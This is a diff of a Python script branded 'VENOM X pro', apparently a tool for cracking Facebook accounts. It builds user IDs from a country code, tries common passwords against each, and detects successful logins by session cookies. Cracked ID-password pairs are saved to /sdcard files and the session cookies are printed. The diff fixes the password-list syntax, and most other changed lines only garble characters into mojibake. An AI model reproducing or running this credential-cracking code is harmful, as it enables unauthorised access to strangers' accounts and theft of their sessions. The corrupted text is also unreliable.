@@ -50,8 +50,8 @@ ha = current.day
 today = date.today()
 
 logo =("""\033[1;32m 
- \033[1;32m  █░█ █▀▀ █▄░█ █▀█ █▀▄▀█
-\033[1;37m   ▀▄▀ ██▄ █░▀█ █▄█ █░▀░█     \033[1;32m X pro \033[1;37m v:0.1           
+ \033[1;32m  â–ˆâ–‘â–ˆâ€ƒâ–ˆâ–€â–€â€ƒâ–ˆâ–„â–‘â–ˆâ€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ–€â–„â–€â–ˆ
+\033[1;37m   â–€â–„â–€â€ƒâ–ˆâ–ˆâ–„â€ƒâ–ˆâ–‘â–€â–ˆâ€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆâ–‘â–€â–‘â–ˆ     \033[1;32m X pro \033[1;37m v:0.1           
 \033[1;32m 
 \033[1;32m 
 \033[1;32m----------------------------------------""")
@@ -135,7 +135,7 @@ def uf():
         print(' \033[1;91m[\033[1;92m\033[1;91m]\033[1;92m COUNTRY CODE : \033[1;32m'+code)
         print("\033[1;32m----------------------------------------")
         for love in user:
-            pwx = [love[1:]'FREE FIRE','112255','112244','09876543','258025','00009999','123412','alamin','nazmul']
+            pwx = [love,'FREE FIRE','112255','112244','09876543','258025','00009999','123412','alamin','nazmul']
             uid = code+love
             morshed.submit(rcrack,uid,pwx,tl)
 def rcrack(uid,pwx,tl):
@@ -145,7 +145,7 @@ def rcrack(uid,pwx,tl):
     global proxy
     try:
         for ps in pwx:
-            sys.stdout.write(f'\r  \33[1;94m[\033[1;37mVENOM😎🔥\33[1;94m][\033[1;37m%s\33[1;94m/\033[1;37m%s\33[1;94m]\33[1;94m[\033[1;32mOK-%s\33[1;94m]\r'%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r  \33[1;94m[\033[1;37mVENOMðŸ˜ŽðŸ”¥\33[1;94m][\033[1;37m%s\33[1;94m/\033[1;37m%s\33[1;94m]\33[1;94m[\033[1;32mOK-%s\33[1;94m]\r'%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             session = requests.Session()
@@ -185,7 +185,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m[VENOM🔥-OK] \033[1;32m'+uid+'\033[1;32m â€¢ \033[1;32m' +ps+    '  \n[] \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\r\r\033[1;32m[VENOMðŸ”¥-OK] \033[1;32m'+uid+'\033[1;32m Ã¢â‚¬Â¢ \033[1;32m' +ps+    '  \n[] \033[1;32m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/VENOM-FILE-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
@@ -193,7 +193,7 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('\r\r\33[1;30m[VENOM👾-CP] ' +uid+ ' â€¢ ' +ps+           '  \33[0;97m')
+                #print('\r\r\33[1;30m[VENOMðŸ‘¾-CP] ' +uid+ ' Ã¢â‚¬Â¢ ' +ps+           '  \33[0;97m')
                 open('/sdcard/VENOM-FILE-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
